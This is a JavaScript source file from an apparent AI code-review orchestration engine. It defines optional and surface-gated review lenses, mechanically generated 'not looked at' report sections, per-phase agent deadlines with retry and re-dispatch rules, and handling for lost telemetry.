// The map is lens → the `scout.surfaces` boolean that must not be affirmatively `false` for the lens
// to run. A missing surfaces object, a missing key, or `true` all KEEP the lens (see the gate in
// reviewProfile): a lens is dropped only where the scout said, in so many words, the surface is absent.
// `wireForm` names every contract another version reads, calls or deploys against (stored and wire
// data, CLI/config/env/chart surface, API/schema versions, exported names): the compat lens covers
// all of them, so a narrower surface would gate it out of the diffs it now exists for.
/** @type {Record<string, keyof NonNullable<ScoutAnswer['surfaces']>>} */
const SURFACE_GATED_LENSES = { 'negative-space': 'crossBoundarySymbol', 'compat': 'wireForm', 'invariants': 'invariantType' }


// ================= The optional pass =================
// Three lenses that do not earn a place on every run. The basis is NOT equal across them: only
// `ownership` (retired, not here) has three independent counts. The two earlier store-wide counts
// named api-idioms and performance among the bottom four; `api-boundary` was not in them at all, so
// for the composition of THIS trio the basis is ONE run — one diff, one repository, one domain
// (realm @nick/craft, node #20, which requires that limit to be stated rather than dropped).
// Measured over runs of the
// budget-deterministic engine against a large Rust diff (14 lenses × 3 rounds, 215 findings):
// `performance` (15 findings, 12 of them Low/Info), `api-idioms` (14/10) and `api-boundary` (11/7)
// returned hundreds of CONFIRMED Medium-and-below findings and NOT ONE High in any of the three.
// Deleting them would make the review worse — the findings are real. Paying three full agents for
// them on every run is the part the numbers do not support. So they leave every automatic path and
// stay reachable by an explicit request.
//
// The failure mode this must not become is the one this repo keeps hitting: a run that never looked
// at performance reading as a run that found nothing wrong with it. So the skipped set is stated
// MECHANICALLY — `optionalSection()`, appended by `out()` to every report the engine can return,
// never asked of the synthesis model, which can die or simply not obey — and filed on the run
// record as `optionalPass`.
//
// STRICT MODE AND THE SECURITY FLOOR TOUCH THIS IN NEITHER DIRECTION, and that is a decision, not
// an omission.
//   · `strict` is the harsh MAINTAINABILITY bar: it forces the maintainability lens and turns its
//     confirmed findings into presumptive blockers. Letting it also buy three unrelated lenses
//     would make one flag mean two things, and would deliver the optional pass to a caller who
//     asked for something else.
//   · The security-sensitive floor expands `blanketLenses()`, and `blanketLenses()` excludes the optional set
//     exactly as it excludes CONDITIONAL_LENSES. A floor is a statement of IGNORANCE about the
//     diff, and ignorance is not a reason to buy the three lenses that measured worst.
//   · Neither may silently DISABLE it either: an explicit `optional=` request is honoured on every
//     path, including a security-floored run and a strict one. The request is the only switch.
const OPTIONAL_LENSES = ['performance', 'api-idioms', 'api-boundary']

// `optional=true` / `--optional` / `optional=all` buys the whole set; `optional=performance,api-boundary`
// (or a JSON array) buys those. Absent buys none.
// An unrecognised name is REFUSED LOUDLY rather than dropped: `optional=perf` that quietly buys
// nothing, on a run whose whole point was to buy something, is the exact silence this section exists
// to prevent — and the run would then report the lens as skipped while the caller believed otherwise.
/** The values that buy no optional lens, and those that buy the whole set (compared as `===` would). */
/** @type {unknown[]} */
const OPTIONAL_NONE = [undefined, null, '', false, 'false', 'none']
/** @type {unknown[]} */
const OPTIONAL_ALL = [true, 'true', 'all']
/** @param {unknown} raw */
function parseOptionalRequest(raw) {
  if (OPTIONAL_NONE.includes(raw)) return { lenses: [], unknown: [] }
  if (OPTIONAL_ALL.includes(raw)) return { lenses: [...OPTIONAL_LENSES], unknown: [] }
  const names = (Array.isArray(raw) ? /** @type {unknown[]} */ (raw) : String(raw).split(/[\s,]+/)).map((/** @type {unknown} */ x) => String(x).trim()).filter(Boolean)
  return { lenses: names.filter(n => OPTIONAL_LENSES.includes(n)), unknown: names.filter(n => !OPTIONAL_LENSES.includes(n)) }
}
const optionalRequest = parseOptionalRequest(A['optional'])
function warnUnknownOptional() {
  if (optionalRequest.unknown.length) {
    log(`⚠️ optional=${JSON.stringify(A['optional'])} names ${optionalRequest.unknown.join(', ')}, which is not an optional lens — the optional roster is ${OPTIONAL_LENSES.join(', ')}. Only the recognised names were admitted.`)
  }
}
warnUnknownOptional()
const optionalRequested = optionalRequest.lenses
// The optional tally is DERIVED, never accumulated. `ran`/`skipped` used to be snapshotted off the
// plan the moment it was built — but the plan is not final there: the completeness critic composes
// lenses much later, on the synthesis phase. Any such later road made the snapshot a LIE in the one
// direction that matters, printing "not looked at" over a lens whose findings were in the report.
// So the tally rests only on what cannot be second-guessed: which optional lenses each profile past
// its mechanical gate could have bought at all (its `optionalScope`, returned on `results`), and
// which ones were actually DISPATCHED (recorded by `runLens`, the single dispatch point for every
// lens on every path — planned, resurrected, or critic-composed). optionalTallyFrom
// (lib/profile-merge.mjs) subtracts, naming each lens once across profiles.
/** @type {Set<string>} */
const optionalDispatched = new Set()
// An optional lens the completeness critic named as an uncovered surface. It is NOT bought (the
// critic is the same model whose spend this pass deliberately took out of model hands), but the
// signal is real and must reach the reader rather than die in the filter.
/** @type {Set<string>} */
const optionalNamedByCritic = new Set()
const optionalTally = () => optionalTallyFrom(results, optionalDispatched, optionalRequested)
// Appended by `out()`, so it reaches every report that has a skipped list to show — the synthesized
// one and the mechanical fallback. The earliest exits (no diff) run before any profile is planned, so
// the list is empty there. A red-gated profile contributes only lenses the caller explicitly requested
// (it aborts before any lens could run), so a default run on which every profile carrying optional
// lenses is red emits no section; a passing profile on a mixed red run still contributes its whole
// scope, and the section then names the gate first. It says "absence of a result", never "no
// problems found".
const optionalSection = () => {
  const skipped = optionalTally().skipped
  if (!skipped.length) return ''
  const named = skipped.filter(l => optionalNamedByCritic.has(l))
  // A red mechanical gate blocks the whole review on its own, so "buy them with optional=…" is the
  // wrong next step there: lenses the caller already requested need no new request, and the rest are
  // beside the point until the gate is green (realm @nick/craft #109).
  if (failedProfiles(results).length) {
    const unrequested = skipped.filter(l => !optionalRequested.includes(l))
    // The critic only ever names an unrequested lens, so it is already in the one optional= offer
    // above; here it is a signal for the re-run, not a second instruction.
    const criticHint = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was not dispatched; once the gate is green, weigh including it in that re-run.\n` : ''
    return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. The mechanical gate is red, which blocks this review by itself — fix the gate first.${unrequested.length ? ` ${unrequested.join(', ')} ${unrequested.length === 1 ? 'is' : 'are'} off by default; add \`optional=${unrequested.join(',')}\` to the re-run only if you want ${unrequested.length === 1 ? 'it' : 'them'}.` : ''}\n` + criticHint
  }
  const criticLine = named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still not dispatched — the optional pass is bought by an explicit request, not by a model mid-run — so buy it deliberately with \`optional=${named.join(',')}\`.\n` : ''
  return `\n\n## Not looked at — the optional pass did not run\n⚠️ These lenses were NOT dispatched, so this review makes NO statement about what they cover: ${skipped.join(', ')}. That is an absence of a result, not a clean one. They are off by default because they returned no High findings on the run that was measured — one diff of one repository, so the basis is a single point, not a settled law; to buy them, re-run with \`optional=true\` (or \`optional=${skipped.join(',')}\`).\n`
    + criticLine
}

// realm @nick/craft #102. Mirrors optionalSection(): derived from the per-profile results of
// reviewProfile's surface gate and appended by out(), so it reaches every report the engine can return, and stated
// MECHANICALLY rather than asked of the synthesis model (which can die or not obey). A whole-repo
// lens is dropped when the diff does not touch the surface its defect class needs — that is an
// ABSENCE of a result for those areas, NOT an approval of them.
// The drops themselves come back PER PROFILE on `results` (`surfaceDropped`) and are merged by
// savedSurfaceDrops (lib/profile-merge.mjs), which keeps only profiles past their gate and subtracts
// what ran elsewhere. Declared here, not where the profiles run, because out() reads it through
// surfaceGateSection() on every early exit too — where it is simply still empty.
/** @type {Result[]} */
const results = []
// The merge and the record's `gate` / `surfaceGate` fields live in lib/profile-merge.mjs (tested
// there).

// Mirrors optionalDispatched: a surface-gated lens actually DISPATCHED in some profile, recorded by
// runLens (the single dispatch point on every path). The gate is a PER-PROFILE decision reading each
// profile's own scout, and negative-space is force-added to every plan — so on a mixed rust+nix diff a
// lens the gate drops in one profile can still run in another. The per-profile drops alone would then
// report a lens as saved while it actually ran, corrupting #102's savings measurement — the same
// snapshot-is-a-lie failure `optionalTally()` already fixed. savedSurfaceDrops subtracts what ran.
/** @type {Set<string>} */
const surfaceGateDispatched = new Set()
// Mirrors optionalNamedByCritic: a surface-gated lens the completeness critic named as an uncovered
// surface. It is NOT re-dispatched (the diff's absent surface is the deliberate boundary, and the
// critic is the same model whose spend this pass took out of model hands), but the signal is real and
// must reach the reader rather than die in the filter.
/** @type {Set<string>} */
const surfaceGateNamedByCritic = new Set()
// The run-level truth, DERIVED not accumulated (mirrors optionalTally): a lens counts as
// surface-gate-dropped only if the gate dropped it in a profile PAST its mechanical gate AND it ran
// in NO active profile.
const surfaceGateTally = () => ({ dropped: savedSurfaceDrops(results, surfaceGateDispatched) })
const surfaceGateSection = () => {
  const gateDropped = surfaceGateTally().dropped
  if (!gateDropped.length) return ''
  // `dropped` already subtracts what ran, so a critic-named lens that ran somewhere is not a gap.
  const named = gateDropped.filter(l => surfaceGateNamedByCritic.has(l))
  return `\n\n## Not run — the diff does not touch the surface these lenses need\n⚠️ These whole-repo lenses were NOT dispatched, so this review makes NO statement about what they cover: ${gateDropped.join(', ')}. Each fires only when the diff touches the surface its defect class needs (a cross-boundary symbol, a wire/serialized form, an invariant-bearing type), and this diff does not. That is an absence of a result, not a clean one.\n`
    + (named.length ? `\n⚠️ The completeness critic named ${named.join(', ')} as an uncovered surface for THIS diff. It was still NOT dispatched — the surface gate is the deliberate boundary, not something a model re-opens mid-run — so treat this as a visible gap, not a clean pass.\n` : '')
}


// ================= Coverage honesty =================
// A verdict must never claim more coverage than the run had. The engine only knows the profiles of
// lib/review-profiles.mjs; everything else in a diff is UNREVIEWED, and saying so is the whole point of the
// helpers this engine imports. They are pure, so they live in lib/review-coverage.mjs — a real, importable,
// linted module with real unit tests. The language roster they need is the mutable PROFILES table, so it is
// passed in as an argument rather than read: that argument is exactly what keeps them extractable.


// The craft release that produced a run. Recorded on every run record and index line so an
// aggregate can be filtered to ONE engine version: without it, "did tightening that lens help?"
// is unanswerable, because the numbers blend runs from every rubric the store has ever seen.
// MUST match `.claude-plugin/plugin.json` — `lib/check-workflows.mjs` fails the build if it drifts.
// Pair it with craftCommit (the engine's git HEAD, added by the logger): the version identifies a
// release, the commit separates two runs of the same release while the rubric is being edited.
const CRAFT_VERSION = '0.34.1' // x-release-please-version
// Severity ordering, worst first.
/** @type {Record<string, number>} */
const SEV_RANK = { Critical: 0, High: 1, Medium: 2, Low: 3, Info: 4 }
// The deletion/recovery-path severity floor, applied before dedup and verification routing: pure helpers,
// tested as a real module in lib/path-severity-floor.mjs.

// ---- adjudicate-track pure helpers ----
// These live in lib/review-adjudicate.mjs — a real, linted module with real unit tests that IMPORT it.


// ---- resilient agent call ----
// agent() returns null when the subagent dies on a terminal API error (after the harness's own
// retries) or is skipped. A single quiet re-dispatch recovers most API deaths. Budget-exceeded
// THROWS and is deliberately not caught — retrying it would just throw again.
const AGENT_TRIES = 2
// Every prompt in this workflow goes through ragent, so this is the one place that can retarget the
// whole review at another checkout. Prepended (not appended) because it has to win over the git
// commands the individual prompts spell out; shq() because the path is an argument to a real `cd`.
const REPO_DIRECTIVE = repoDirective()
function repoDirective() {
  return repoArg
    ? `WORKING DIRECTORY: this review targets the repository at ${shq(repoArg)} — NOT the directory you start in. Before ANY git / cargo / nix / file command, \`cd\` there (or pass \`git -C\`). Every file path in this review is relative to that root. If that directory does not exist or is not a git repository, say so and stop rather than reviewing whatever repo you happen to be sitting in.\n\n`
    : ''
}
// ---- per-agent wall-clock deadline ----
// The retry above only fires when agent() RESOLVES to null. An agent whose request hangs mid-response
// never resolves and never throws, so nothing above catches it. A measured run lost 64 minutes — a
// third of its wall clock — to six agents frozen inside one `parallel()` barrier, and then died
// without writing anything. The fix is to stop WAITING, not to wait more cleverly.
//
// Honest limit: the sandbox exposes setTimeout/clearTimeout but no AbortController, so losing the
// race abandons the wait without cancelling the agent — a hung one keeps its concurrency slot until
// the harness reaps it. That is still the difference between a phase that proceeds shorthanded and a
// review that stops dead, which is what actually happened.
//
// The clock starts at DISPATCH, so a deadline covers queue wait PLUS execution — not execution
// alone. Calibrating against execution time was a real and expensive mistake: Verify sat at 15min
// against an 811s measured maximum, then a ~130-thunk wave queued agents for a quarter of an hour
// before they ran, the deadline fired on agents that were merely waiting, and 23 findings cost 172
// verification agents. Dispatch is windowed now (VERIFY_WINDOW_AGENTS), which caps the queue term — and
// these numbers are set against the SUM: ~24 agents dispatched in flight over an execution p90 of
// ~360s is well under 15min of waiting, so 30min leaves real headroom above both parts. The window
// bounds DISPATCH, not occupancy: the re-dispatch below leaves the abandoned agent holding its
// harness slot, so occupancy can transiently reach ~48 — but only after a 30min deadline, so it
// cannot rebuild the storm. Lenses get 90min for a blunter reason: a single lens legitimately ran
// 46 minutes, so no threshold there can separate "hung" from "thorough" — it is a backstop against
// an agent stuck for hours, nothing finer.

// ---- re-dispatch breaker (verification only) ----
// ARMED BY THE CALLER, NOT BY A PHASE LABEL, and that distinction is the whole scope of this thing.
// What makes a dead dispatch worth suppressing is that it is dispatched THROUGH THE BOUNDED
// VERIFICATION WINDOW (VERIFY_WINDOW_AGENTS): there a slot held by a dead agent is a slot DENIED to
// a live one. `opts.phase` cannot say that — it is the key into PHASE_DEADLINE_MS, a deadline
// bucket, and three dispatches wear `phase: 'Verify'` while running nowhere near the window: the
// single haiku dedup agent (before the pool), the `<profile>-verify` checkpoint (after it), and
// anything later that reuses the bucket. Keying on the label leaked both ways — a dead one of those
// ate a window slot's worth of evidence, and a live one wrote reachability the pool never observed.
// So `verifyPool` creates a breaker and hands it to exactly the dispatches it windows; every other
// dispatch, in any phase, passes none and is neither counted nor allowed to reset anything. A lens
// is deliberately not given one: there a suppressed re-dispatch costs a whole dimension of the
// review, and the window is not the scarce thing.

// ---- slicing the diff a lens reviews ----
// Pure helper, tested as a real module in lib/lens-scope.mjs. The measurement that motivates it — lenses at 73.6% of a run, the whole diff
// pulled by every lens on every round — lives there, with the risk it does not solve.

// ---- one budget, shared by the attempts ----
// Pure helper, tested as a real module in lib/agent-deadline.mjs. The rationale for a shared budget — and why the thresholds themselves must NOT
// move — lives there.

const DEFAULT_DEADLINE_MS = 1800000
/** @type {Record<string, number>} */
const PHASE_DEADLINE_MS = { Scout: 900000, Gate: 1800000, Lenses: 5400000, Verify: 1800000, Adjudicate: 1800000, Synthesize: 1800000 }
// A caller-supplied ceiling, applied to every phase that does not name its own. It only ever
// REPLACES the per-phase table, never the explicit `deadlineMs` an individual dispatch passes —
// preflight's 5min is a property of preflight, not a default to be overridden from the outside.
const deadlineArg = deadlineArgMs()
function deadlineArgMs() {
  return Number(A['deadlineMs']) > 0 ? Number(A['deadlineMs']) : 0
}
// The CEILING on the smallest remainder a re-dispatch is allowed to be launched into — not the
// floor itself, which is derived from the budget by `retryFloorFor` below. A POLICY DECISION, not a
// measurement: nothing recorded derives it. It is set against the measured live distribution from
// the other side — live verifiers answer in tens of seconds, so against an ordinary phase budget a
// remainder under a minute is a poor bet and mostly buys a harness slot to time out in.
// That reasoning is scale-bound, and the scaling below is the admission of it: under a budget of
// 100s the floor is 50s, and a re-dispatch does then go out into a remainder this paragraph would
// have called implausible. The trade is deliberate. A floor that cannot adapt is worse, because
// against a budget shorter than itself it is true before anything has run and removes the retry
// ladder entirely, which is a silent behaviour change rather than a judged bet.
const RETRY_FLOOR_MS = 60000
// The floor is RELATIVE to the budget it guards, never a flat minute. A flat minute against a
// budget SHORTER than a minute is true before the first attempt even runs, so every agent in such a
// run loses its re-dispatch — the whole retry ladder the death breaker is calibrated against
// vanishes, and the transcript says "no wall clock left to wait in" over a budget that has barely
// been touched. `deadlineMs=30000` is a documented diagnostic setting, so this is reachable, not
// theoretical. Half the budget is the cap: it keeps the guard meaningful at every scale, since a
// remainder under half of what the first attempt had is a poor bet whatever the absolute numbers.
const retryFloorMs = (/** @type {unknown} */ totalMs) => Math.min(RETRY_FLOOR_MS, Math.floor((Number(totalMs) > 0 ? Number(totalMs) : 0) / 2))
// SAID OUT LOUD, once, at the top of the run. This one argument replaces the WHOLE phase table,
// including the 90 minutes a lens is legitimately allowed (one measured lens ran 46). Set too low it
// kills live work by deadline, and a run full of deadline fires is indistinguishable, in the
// transcript, from the API outage this code was written for — so the mistake would be diagnosed as
// the very thing it imitates. Naming the override where a reader meets it first is the cheapest
// defence there is; the transcript is the only carrier the run's clock is ever measured from.
function announceDeadlineOverride() {
  if (deadlineArg) {
    // BOTH DIRECTIONS. The argument replaces the table, so it lengthens as readily as it shortens, and
    // a phase given four times its budget changes what the run does just as surely — it is simply
    // slower to notice. Naming only the cuts left the other half of the override unrecorded in the one
    // place this run's clock is ever read from.
    // Sub-minute values print as seconds. Rounding a 30s override to "0min" is the same defect the
    // deadline log was fixed for, inverted — and worse here, because 30000 is exactly the documented
    // diagnostic value this warning exists to explain, so the one reader it was written for is the one
    // it would mislead.
    const m = (/** @type {number} */ v) => (v >= 60000 ? `${Math.round(v / 60000)}min` : `${Math.max(1, Math.round(v / 1000))}s`)
    const moved = (/** @type {number} */ dir) => Object.entries(PHASE_DEADLINE_MS).filter(([, v]) => (dir < 0 ? v > deadlineArg : v < deadlineArg)).map(([k, v]) => `${k} ${m(v)}→${m(deadlineArg)}`)
    const shortened = moved(-1)
    const lengthened = moved(1)
    log(`⏱️ deadlineMs=${deadlineArg} replaces the per-phase deadline table for every phase that does not name its own`
      + `${shortened.length ? ` — SHORTENING ${shortened.join(', ')}. A phase cut below the live distribution will fire its deadline on healthy agents, and a transcript full of deadline fires reads like an API outage.` : ''}`
      + `${lengthened.length ? ` — LENGTHENING ${lengthened.join(', ')}.` : ''}`
      // Scoped honestly: the floor is derived per dispatch, and a dispatch that names its own deadline
      // (preflight's 5 minutes) is not overridden by this argument at all, so its floor stays the full
      // minute. Stating the drop globally would hand the transcript's reader a calibration that holds
      // for most agents and not all — and a wrong calibration is read with the same confidence as a
      // right one.
      + `${deadlineArg < RETRY_FLOOR_MS * 2 ? ` NOTE: for the phases this argument governs, the re-dispatch floor drops with it to ${Math.round(Math.floor(deadlineArg / 2) / 1000)}s, so a dead agent gets a much shorter second attempt than usual; a dispatch carrying its own deadline keeps its own floor.` : ''}`)
  }
}
announceDeadlineOverride()
// The run's stop at a usage limit (realm @nick/craft, node #299): once one agent failed on it, ragent
// dispatches no more review work; only the bookkeeping writes still go, so the record is attempted (on
// the same account, so under an account-wide limit it stays in `.partial` for `craft-log-run recover`).
const limitStop = makeLimitStop(log)
/** @param {AgentOpts} opts */
function deadlineMsFor(opts) {
  const explicit = Number(opts.deadlineMs)
  if (Number.isFinite(explicit) && explicit > 0) return explicit
  return deadlineArg || (PHASE_DEADLINE_MS[/** @type {string} */ (opts.phase)] ?? DEFAULT_DEADLINE_MS)
}
/**
 * With a tagged `schema`, the validated answer or `null` (dead, skipped, or past its deadline); without
 * one, the agent's final text or `null` — `unknown`, since nothing here validates it.
 * @template [T=unknown]
 * @param {string} prompt
 * @param {AgentOpts & { schema?: Schema<T> | undefined }} [opts]
 * @returns {Promise<T | null>}
 */
async function ragent(prompt, opts = {}) {
  // deadlineMs, breaker, inSessionDir and bookkeeping are ours, not agent()'s -- strip them so none reaches the harness
  // as an unknown option.
  const { deadlineMs: _deadlineMs, breaker, inSessionDir: _inSessionDir, bookkeeping, ...agentOpts } = opts
  if (!bookkeeping && limitStop.seen()) return null
  const ms = deadlineMsFor(opts)
  // ONE budget for the whole call, not one per attempt. The worst case of a hanging dispatch is
  // therefore `ms` of waiting in total rather than `ms` per attempt — which, in the Verify window,
  // is the difference between one slot held for 30 minutes and one held for an hour.
  // ARMED, not measured: the sandbox has no clock at all (see the module), so every attempt races
  // the SAME timer rather than a fresh one computed from elapsed time.
  const deadlineBudget = makeDeadlineBudget(ms, { floorMs: retryFloorMs(ms) })
  try {
    // The one place the sandbox's `unknown` becomes the schema's type: agent() validates against the
    // schema it was handed, and `opts.schema` is that schema with the type it validates into.
    return /** @type {T | null} */ (await withBudget(prompt, agentOpts, deadlineBudget, breaker, opts))
  } finally {
    // The armed timers outlive the answer otherwise, holding the run open for the whole deadline.
    deadlineBudget.dispose()
  }
}

/** @param {string} prompt @param {AgentOptions} agentOpts @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {Promise<unknown>} */
async function withBudget(prompt, agentOpts, deadlineBudget, breaker, opts) {
  for (let attempt = 1; ; attempt++) {
    const o = attempt === 1 ? agentOpts : { ...agentOpts, label: `retry:${agentOpts.label || 'agent'}` }
    // The SHARED deadline promise, not a per-attempt timer. A second attempt inherits what is left
    // of the first one's wait by construction — there is nothing to subtract and no clock to read.
    // inSessionDir: the one step that must read the session's own project, not the `repo` under review.
    const res = await raceLimited(prompt, o, deadlineBudget, opts)
    if (res === LIMIT_HIT) return null
    // Asked AFTER the race, so it reflects the state the attempt actually ended in. A re-dispatch
    // launched below the floor would fire the deadline before the agent could answer, costing a
    // harness slot to produce nothing.
    const spentOut = deadlineBudget.belowFloor()
    if (res === DEADLINE_HIT) {
      logDeadlineFire(o, deadlineBudget)
      return null
    }
    if (res !== null && res !== undefined) {
      // A live answer enters the window as one observation of a reachable API: an outage that ended
      // slides out of the window and the re-dispatch comes back for the next isolated failure.
      if (breaker) breaker.recordLive()
      return res
    }
    if (!redispatchAfterDeath(attempt, spentOut, deadlineBudget, breaker, opts)) return null
  }
}

const LIMIT_HIT = { craftUsageLimit: true }
/** One attempt raced against the deadline; LIMIT_HIT when it failed on a usage limit (thrown or answered). @param {string} prompt @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget @param {AgentOpts} opts @returns {Promise<unknown>} */
async function raceLimited(prompt, o, deadlineBudget, opts) {
  try {
    const res = await Promise.race([agent(`${opts.inSessionDir ? '' : REPO_DIRECTIVE}${prompt}`, o), deadlineBudget.hit])
    return limitStop.observeAnswer(res) ? LIMIT_HIT : res
  } catch (e) {
    if (limitStop.observeError(e)) return LIMIT_HIT
    throw e
  }
}

/** A deadline fire, logged against the budget it spent. @param {AgentOptions} o @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget */
function logDeadlineFire(o, deadlineBudget) {
  // Deliberately neither counted by the breaker nor a reset of it: a deadline fire cannot be
  // told apart from a live agent taking too long, and feeding that into the window would let slow
  // work suppress the retry that real work depends on. The breaker reads deaths, never durations.
  // THE BUDGET, NOT WHAT THIS ATTEMPT WAITED, and the log says which. With no clock there is no
  // honest per-attempt figure — an earlier version printed one and it was wrong by most of the
  // deadline on a second attempt. A number nobody computed is worse than a coarser number that
  // is true, because the transcript is the only carrier this run's clock is ever measured from
  // and a reader calibrates deadlines against what it says.
  // Sub-minute budgets print as seconds rather than rounding up to "1min": `deadlineMs=30000` is
  // a documented diagnostic value, and a log calling it "0min" or "1min" hides the very setting
  // whose effects the reader is trying to see.
  const ms = deadlineBudget.total()
  const waited = ms >= 60000 ? `${Math.round(ms / 60000)}min budget` : `${Math.max(1, Math.round(ms / 1000))}s budget`
  // A DEADLINE FIRE NEVER RE-DISPATCHES, and this is an identity rather than a policy: the timer
  // is armed ONCE, for the whole budget, when the budget is created — so its firing IS the budget
  // running out, and one budget shared by the attempts leaves the next one nothing to wait in. The branch that used to re-dispatch here
  // is unreachable under that arithmetic, so it is gone rather than left as reassuring dead text.
  // The re-dispatch survives for the case it was always really for: the FAST death, which spends
  // almost none of the budget. A hang is evidence about the request; a fast death is evidence
  // about reachability, and only the second is worth asking twice.
  log(`⏱️ agent '${o.label || '?'}' exhausted its ${waited} with no response — abandoning the wait (the deadline is one budget shared by the attempts and a fire spends it, so there is nothing left to re-dispatch into; treated as a dead agent)`)
}

/**
 * After an attempt that came back empty: whether to re-dispatch (true) or treat the agent as dead (false).
 * @param {number} attempt @param {boolean} spentOut @param {ReturnType<typeof makeDeadlineBudget>} deadlineBudget
 * @param {ReturnType<typeof makeDeathBreaker> | null | undefined} breaker @param {AgentOpts} opts @returns {boolean}
 */
function redispatchAfterDeath(attempt, spentOut, deadlineBudget, breaker, opts) {
  if (attempt >= AGENT_TRIES) return false
  // A death that arrived slowly can exhaust the budget too, and then the re-dispatch buys nothing.
  if (spentOut) {
    // Says how much was left and what it was measured against, rather than the flat "nothing left"
    // that used to be printed over a remainder that was merely below the floor. The transcript is
    // the only carrier this run's clock is ever measured from, and "spent" and "below the floor"
    // are different events that a future reader has to be able to tell apart.
    log(`⏱️ agent '${opts.label || '?'}' returned no result with less than the ${Math.round(retryFloorMs(deadlineBudget.total()) / 1000)}s floor left of its ${Math.round(deadlineBudget.total() / 1000)}s deadline budget — NOT re-dispatching (a second attempt would time out before it could answer); treated as a dead agent`)
    return false
  }
  // The dead-agent route, and the expensive one: `agent()` resolved null after the harness spent
  // its own retry ladder on an unreachable API, and the re-dispatch below spends a second ladder
  // inside the same verification window slot. On a one-off failure that is worth the clock; once
  // half of the recent windowed dispatches are coming back empty it is not, and the breaker's
  // window is what says which this is.
  //
  // The log says exactly what the breaker counted and nothing more. Only a FIRST attempt reaches
  // this line (the line above returns on the last one), so the window holds one observation per
  // dispatched unit of work — never per harness call. A message phrased as "the Nth death in a
  // row" claimed both a consecutive run the window does not track and a count of dispatches it
  // does not hold: with one re-dispatch per death, an outage of N observed deaths has already
  // cost up to 2N−(suppressed) harness dispatches.
  if (breaker && !breaker.deathAllowsRedispatch()) {
    log(`⛔ agent '${opts.label || '?'}' returned no result — ${breaker.deaths()} of the last ${breaker.observed()} windowed verification dispatches returned nothing, so this one is NOT re-dispatched (the re-dispatch is for a one-off failure, and at this rate it is not one); treated as a dead agent, reported as unverified exactly like every other death`)
    return false
  }
  log(`⚠️ agent '${opts.label || '?'}' returned no result (API death or skip) — re-dispatching once`)
  return true
}

// ---- run-record helpers (lib/run-record.mjs) ----
// Imported: summarizeFindings, reviewVerdict, fingerprint, shingleOverlap, matchesPrior,
// rereviewVerdict and their kin. (selectPriorRound is NOT used here: round selection, ancestry and record
// loading happen in `craft-log-run.mjs prior-round` — a haiku still runs the command and carries the bytes
// back, but it decides nothing.)

// finalVerdict is workflow-local — NOT part of lib/run-record.mjs.
// In strict mode the maintainability bar is a presumption of block: any Confirmed
// maintainability finding at Medium or above escalates the verdict to Block. Outside strict mode
// the base verdict stands (maintainability findings are at most a Warning).
// A finding counts as maintainability for the strict escalation if its own source is maintainability
// OR a maintainability finding was merged into it during cross-lens dedup (dedupPool carries every
// contributing source in `sources`). Without the second clause a maintainability finding absorbed
// under a same-severity non-maintainability base would silently escape the strict Block.
/** @param {Finding} f */
function isMaintainability(f) {
  return (f['source'] || '') === 'maintainability' || (Array.isArray(f['sources']) && /** @type {unknown[]} */ (f['sources']).includes('maintainability'))
}
/** @param {Finding[]} confirmedIn */
function finalVerdict(confirmedIn) {
  if (strict && confirmedIn.some(f => isMaintainability(f)
    && (f['severity'] === 'Critical' || f['severity'] === 'High' || f['severity'] === 'Medium'))) return 'Block'
  return reviewVerdict(confirmedIn)
}
// indexProjection is NOT mirrored here any more: lib/craft-log-run.mjs imports the real one and owns
// the index line. A second copy in the workflow would be a copy nothing calls — free to drift out of
// sync with the projection that actually gets written, which is the worst kind of dead code.
// A phase checkpoint. Small by construction — counts, per-lens yields, the gate verdict — because
// its job is to survive the run, not to duplicate the final record early. `runDir` is threaded back
// out of the first call so every later checkpoint lands in the same directory without the sandbox
// needing a clock or a run id (it has neither).
// Telemetry is written by an agent shelling out to lib/craft-log-run.mjs, so it fails for reasons the
// run itself survives: a craftRoot that no longer exists, a dead logger agent, a damaged store. That
// failure used to be pure silence — the review finished, the store stayed empty, and an empty store
// is indistinguishable from "this review was never run" (realm @nick/craft, node #24).
// The choice is deliberate and recorded (realm @nick/craft, node #34): a lost record NEVER fails the
// run. Killing a three-hour review over a bookkeeping write would teach everyone to ignore the very
// marker this exists to raise. It is reported instead, in the report a human actually reads.
/** @type {string[]} */
const telemetryLost = []
/** @param {string} what @param {unknown} [why] */
function noteTelemetryLoss(what, why) {
  const line = `${what}${why ? ` — ${why}` : ''}`
  telemetryLost.push(line)
  log(`⚠️ telemetry lost: ${line}`)
}
// The bookkeeping calls — the run record, the phase checkpoints, the prior-round read — must not
// take the run down when they throw. `quietly` is the shared wrapper (lib/run-logging.mjs); here it is bound to `ragent` so the retry-once behaviour still applies underneath.
// The wrapper is generic over the callback, so what it yields is ragent's answer, null, or the throw.
/**
 * ragent for a bookkeeping write: still dispatched after a usage limit stopped the review work.
 * @template [T=unknown]
 * @param {string} p
 * @param {AgentOpts & { schema?: Schema<T> | undefined }} o
 * @returns {Promise<T | null>}
 */
function ragentBookkeeping(p, o) {
  return ragent(p, { ...o, bookkeeping: true })
}
const ragentQuietly = quietly(ragentBookkeeping)
/**
 * A quiet call's outcome split in two: the answer (null when the agent died OR threw), and the throw's
 * message ('' when it did not throw).
 * @template T
 * @param {T | { __threw: string } | null} res
 * @returns {{ answer: T | null, threw: string }}
 */
function splitThrew(res) {
  if (res && typeof res === 'object' && '__threw' in res) return { answer: null, threw: String(res.__threw) }
  return { answer: /** @type {T | null} */ (res), threw: '' }
}

// Re-review memory outcome, surfaced in the user-facing report (realm @nick/craft #104). A DETACHED
// HEAD makes the prior-round lookup return 'no-branch', so the run silently becomes round 1 with no
// chaining and no signal. `reReviewMemory` (below) sets this note; it is null on every run that chained
// normally or is a genuine first review, so the section is empty then. Declared before `out()` so an
// early exit that returns before the prior-round read sees a plain null, never a temporal-dead-zone.
/** @type {string | null} */
let reReviewMemoryNote = null
// Prepended by `out()` — near the top, above the verdict — because a re-review that quietly forgot its
// memory must be visible before the verdict, not buried after it.
